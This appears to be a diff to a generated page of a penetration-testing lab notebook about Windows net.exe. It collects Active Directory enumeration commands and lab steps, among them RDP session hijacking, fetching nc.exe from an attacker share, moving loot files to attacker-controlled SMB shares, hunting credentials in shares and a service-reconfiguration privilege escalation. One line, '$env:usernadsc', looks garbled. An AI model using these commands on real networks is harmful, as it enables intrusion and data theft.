@@ -9,6 +9,94 @@ hideFooterPagination: true
 
 {/* Generated from Commands/net.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## net.exe: choose the operation and read the result
+
+Query Windows users, groups and account policy.
+
+### What the result establishes
+
+Separate local machine queries from /domain queries and inspect the resulting account/group context.
+
+### Prerequisites and common failures
+
+Display names can be localized, and a command's successful query does not establish rights to modify the returned objects.
+
+### Example 1: Commands
+
+Run in: **Windows cmd.exe**.
+
+```bash
+net user /domain
+net user USER /domain
+net group "Domain Admins" /domain
+net accounts /domain
+```
+
+### Example 2: 6. Net Commands
+
+Run in: **Saved lab example**.
+
+```powershell
+net user /domain
+```
+
+Saved context: [Enumerate Active Directory with Built-in Tools — 6. Net Commands](/active-directory/living-off-the-land#6-net-commands). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: 6. Net Commands
+
+Run in: **Saved lab example**.
+
+```powershell
+net group /domain
+```
+
+Saved context: [Enumerate Active Directory with Built-in Tools — 6. Net Commands](/active-directory/living-off-the-land#6-net-commands). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: 6. Net Commands
+
+Run in: **Saved lab example**.
+
+```powershell
+net accounts /domain
+```
+
+Saved context: [Enumerate Active Directory with Built-in Tools — 6. Net Commands](/active-directory/living-off-the-land#6-net-commands). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: 6. Net Commands
+
+Run in: **Saved lab example**.
+
+```powershell
+net user <ACCOUNT_NAME> /domain
+```
+
+Saved context: [Enumerate Active Directory with Built-in Tools — 6. Net Commands](/active-directory/living-off-the-land#6-net-commands). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: 6. Net Commands
+
+Run in: **Saved lab example**.
+
+```powershell
+net group "Domain Admins" /domain
+```
+
+Saved context: [Enumerate Active Directory with Built-in Tools — 6. Net Commands](/active-directory/living-off-the-land#6-net-commands). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: User Enumeration
+
+Run in: **Saved lab example**.
+
+```powershell
+$env:usernadsc
+net accounts
+```
+
+Saved context: [Windows Privilege Escalation: Full Checklist — User Enumeration](/privesc/windows-privesc-checklist#user-enumeration). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Query Windows users, groups and account policy.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=net) · [All tools](/index)
@@ -44,6 +132,13 @@ whoami /priv
 net user USER /domain
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [AD groups and effective access — Windows — inspect the current session](/field/ad-groups#windows-—-inspect-the-current-session)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="11. File transfer over a pivot">
@@ -59,6 +154,13 @@ copy C:\loot.zip \\172.16.119.13\share\
 # then pull DMZ01 -> Kali over SSH:  scp jbetty@<DMZ>:/path/loot.zip ~/loot/
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 11. File transfer over a pivot](/cheatsheets/ad-attack-path-worked-example#11-file-transfer-over-a-pivot)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Active Directory Attack Path: Worked Lab**
 
 Context from the notebook: Reachability rule:  the pivot is  one‑way  (Kali → internal). Internal hosts  cannot  reach your external Kali IP — so  net use \\&lt;KALI>\share  from the DC fails with  System error 53 , and  proxychains impacket-smbserver  does NOT help (proxychains only proxies  outbound clients , not a  listening server ).
@@ -66,6 +168,13 @@ Context from the notebook: Reachability rule:  the pivot is  one‑way  (Kali �
 ```text
 net use \\<KALI>\share
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 11. File transfer over a pivot](/cheatsheets/ad-attack-path-worked-example#11-file-transfer-over-a-pivot)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -88,6 +197,13 @@ net rpc group members '<GROUP>' -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
 net rpc user info <USER> -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
     # Show the groups a domain user belongs to
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Enumeration Commands — Groups](/active-directory/command-reference#groups)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -123,6 +239,13 @@ nxc winrm <DC_IP> -u <USER> -p '<PASSWORD>' -d <DOMAIN>
 evil-winrm -i <DC_IP> -u <USER> -p '<PASSWORD>'
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Enumeration Commands — Quick Htb Workflow](/active-directory/command-reference#quick-htb-workflow)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Users">
@@ -144,6 +267,13 @@ GetADUsers.py -all -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASSWORD>'
 net rpc user info <USER> -U '<DOMAIN>/<USER>%<PASSWORD>' -S <DC_IP>
     # Show information and group memberships for a user
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Enumeration Commands — Users](/active-directory/command-reference#users)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -176,6 +306,13 @@ whoami /priv
     # Show privileges assigned to the current Windows account
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Enumeration Commands — Windows Local Groups](/active-directory/command-reference#windows-local-groups)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="RDP Session Hijacking">
@@ -187,6 +324,13 @@ whoami /priv
 ```cmd
 C:\htb> net start sessionhijack
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — RDP Session Hijacking](/modules/common-services/full-reference#rdp-session-hijacking) · [Attacking RDP: Module Notes — RDP Session Hijacking](/modules/common-services/rdp#rdp-session-hijacking)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -202,6 +346,13 @@ C:\htb> net use n: \\192.168.220.129\Finance
 The command completed successfully.
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — Windows](/modules/common-services/full-reference#windows)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Common Services: Full Module Reference**
 
 ```cmd
@@ -209,6 +360,13 @@ C:\htb> net use n: \\192.168.220.129\Finance /user:plaintext Password123
 
 The command completed successfully.
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Common Services: Full Module Reference — Windows](/modules/common-services/full-reference#windows)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -222,11 +380,25 @@ The command completed successfully.
 net accounts /domain
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Enumerate Active Directory with Built-in Tools — 6. Net Commands](/active-directory/living-off-the-land#6-net-commands) · [AD Password Policies and User Lists — Key Enumeration Methods](/active-directory/password-policy-user-lists#key-enumeration-methods) · [Active Directory Troubleshooting — Corrections to remember](/active-directory/troubleshooting#corrections-to-remember)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Enumerate Active Directory with Built-in Tools**
 
 ```powershell
 net group /domain
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Enumerate Active Directory with Built-in Tools — 6. Net Commands](/active-directory/living-off-the-land#6-net-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 **Enumerate Active Directory with Built-in Tools**
 
@@ -234,17 +406,38 @@ net group /domain
 net group "Domain Admins" /domain
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Enumerate Active Directory with Built-in Tools — 6. Net Commands](/active-directory/living-off-the-land#6-net-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Enumerate Active Directory with Built-in Tools**
 
 ```powershell
 net user /domain
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Enumerate Active Directory with Built-in Tools — 6. Net Commands](/active-directory/living-off-the-land#6-net-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Enumerate Active Directory with Built-in Tools**
 
 ```powershell
 net user <ACCOUNT_NAME> /domain
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Enumerate Active Directory with Built-in Tools — 6. Net Commands](/active-directory/living-off-the-land#6-net-commands)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -259,12 +452,26 @@ net use n: \\<ATTACKER_IP>\share /user:test test
 copy n:\nc.exe
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — SMB Downloads](/post-exploitation/file-transfers-cheat-sheet#smb-downloads)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **File Transfers for Linux and Windows**
 
 ```powershell
 net use \\10.10.14.249\CompData /user:grcan grcan123
 move "Summary-Report-inlanefreight.local.html" \\10.10.14.249\CompData
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [File Transfers for Linux and Windows — SMB Downloads](/post-exploitation/file-transfers-cheat-sheet#smb-downloads)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -287,6 +494,13 @@ grep -riE "runas|net use|Invoke-Command|New-PSSession|ConvertTo-SecureString" .
 # anything with "service account" / "svc_" in filenames
 find . -iname "*svc*" -o -iname "*service*account*"
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Find Credentials in Network Shares — Find Credentials in Network Shares](/password-attacks/credential-hunting-in-network-shares)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -318,6 +532,13 @@ scp jbetty@<DMZ_IP>:/tmp/loot.zip ~/loot/
 #    Kali:     echo '<paste>' | base64 -d > x
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — Pulling files FROM the target to Kali (the hard direction)](/cheatsheets/pivoting-file-transfer#pulling-files-from-the-target-to-kali-the-hard-direction)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Quick-start command cheat (run first, always)">
@@ -339,6 +560,13 @@ net user; net localgroup administrators
 Get-WmiObject win32_service | ? {$_.StartMode -eq 'Auto' -and $_.State -ne 'Running'}
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Privilege Escalation: Choose a Checklist — Quick-start command cheat (run first, always)](/privesc/index#quick-start-command-cheat-run-first-always-2)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Domain context">
@@ -353,6 +581,13 @@ net group "Domain Admins" /domain            :: who are the DAs
 nltest /dclist:<domain>                       :: list DCs
 echo %LOGONSERVER%                            :: which DC logged you in
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — Domain context](/cheatsheets/windows-post-exploitation#domain-context)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -373,6 +608,13 @@ net localgroup "Remote Management Users"     :: who can WinRM
 query user                                   :: WHO IS LOGGED IN RIGHT NOW (jump-host gold)
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — The box & the users](/cheatsheets/windows-post-exploitation#the-box-&-the-users)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="EoP - Processes Enumeration and Tasks">
@@ -390,6 +632,13 @@ Get-Process
 Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — EoP - Processes Enumeration and Tasks](/privesc/windows-privesc-checklist#eop-processes-enumeration-and-tasks)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Windows Privilege Escalation: Full Checklist**
 
 ```powershell
@@ -397,6 +646,13 @@ net start
 wmic service list brief
 tasklist /SVC
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — EoP - Processes Enumeration and Tasks](/privesc/windows-privesc-checklist#eop-processes-enumeration-and-tasks)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -415,6 +671,13 @@ sc config upnphost depend= ""
 net start upnphost
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Example with Windows XP SP1 - upnphost](/privesc/windows-privesc-checklist#example-with-windows-xp-sp1-upnphost)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Windows Privilege Escalation: Full Checklist**
 
 ```powershell
@@ -425,6 +688,13 @@ net start upnphost
 
 sc config upnphost depend=""
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Example with Windows XP SP1 - upnphost](/privesc/windows-privesc-checklist#example-with-windows-xp-sp1-upnphost)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -438,6 +708,13 @@ sc config upnphost depend=""
 net share
 powershell Find-DomainShare -ComputerDomain domain.local
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — Network Enumeration](/privesc/windows-privesc-checklist#network-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -454,12 +731,26 @@ Get-LocalUser | ft Name,Enabled,LastLogon
 Get-ChildItem C:\Users -Force | select Name
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — User Enumeration](/privesc/windows-privesc-checklist#user-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Windows Privilege Escalation: Full Checklist**
 
 ```powershell
 $env:usernadsc
 net accounts
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — User Enumeration](/privesc/windows-privesc-checklist#user-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 **Windows Privilege Escalation: Full Checklist**
 
@@ -469,12 +760,26 @@ net user admin
 net user %USERNAME%
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — User Enumeration](/privesc/windows-privesc-checklist#user-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Windows Privilege Escalation: Full Checklist**
 
 ```powershell
 net localgroup
 Get-LocalGroup | ft Name
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — User Enumeration](/privesc/windows-privesc-checklist#user-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 **Windows Privilege Escalation: Full Checklist**
 
@@ -483,6 +788,13 @@ net localgroup administrators
 Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — User Enumeration](/privesc/windows-privesc-checklist#user-enumeration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -498,6 +810,13 @@ Context from the notebook: Without Credentials:  You can test for a NULL session
 net use \\<HOST>\ipc$ "" /u:""
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [AD Password Policies and User Lists — Key Enumeration Methods](/active-directory/password-policy-user-lists#key-enumeration-methods)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="8. Windows privesc">
@@ -512,6 +831,13 @@ Context from the notebook: Then:  net user ,  net localgroup administrators ,  s
 net user
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 8. Windows privesc](/cheatsheets/ad-attack-path-worked-example#8-windows-privesc) · [Shells, Payloads, and Interactive TTYs — What Defenders Monitor](/exploitation/shells-payloads-cheat-sheet#what-defenders-monitor) · [Privilege Escalation: Choose a Checklist — Windows](/privesc/index#windows)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Active Directory Attack Path: Worked Lab**
 
 Context from the notebook: Then:  net user ,  net localgroup administrators ,  systeminfo ,  ipconfig /all ,  netstat -ano .
@@ -519,6 +845,13 @@ Context from the notebook: Then:  net user ,  net localgroup administrators ,  s
 ```text
 net localgroup administrators
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 8. Windows privesc](/cheatsheets/ad-attack-path-worked-example#8-windows-privesc)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -534,6 +867,13 @@ Context from the notebook: net use \\KALI\..  →  System error 53 Internal host
 net use \\KALI\..
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 🚨 GLOBAL CAVEATS (the stuff that wasted hours)](/cheatsheets/ad-attack-path-worked-example#-global-caveats-the-stuff-that-wasted-hours) · [Pivoting and File Transfer: Field Reference — 🧯 CAVEATS TABLE](/cheatsheets/pivoting-file-transfer#-caveats-table)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="ACL / object‑control edges (the escalation bread‑and‑butter)">
@@ -547,6 +887,13 @@ Context from the notebook: ForceChangePassword Reset their password (no old pw) 
 ```text
 net rpc password
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [BloodHound: Full Reference — ACL / object‑control edges (the escalation bread‑and‑butter)](/cheatsheets/bloodhound-complete-guide#acl-/-object‑control-edges-the-escalation-bread‑and‑butter)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -562,6 +909,13 @@ Context from the notebook: Read the current policy as an attacker with:  net acc
 net accounts
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Password Policy Concepts and Remediation — Enforcement in Active Directory](/password-attacks/password-policies#enforcement-in-active-directory) · [Password Policy Concepts and Remediation — Key takeaways](/password-attacks/password-policies#key-takeaways)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="The reachability rule — pivots are usually ONE‑WAY">
@@ -576,6 +930,21 @@ Context from the notebook: That's why  net use \\&lt;KALI_IP>\share  from a DC f
 net use \\<KALI_IP>\share
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — The reachability rule — pivots are usually ONE‑WAY](/cheatsheets/pivoting-file-transfer#the-reachability-rule-—-pivots-are-usually-one‑way)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Enumerate Active Directory with Built-in Tools](/active-directory/living-off-the-land)
+
+{/* VAULT_RELATED_END */}
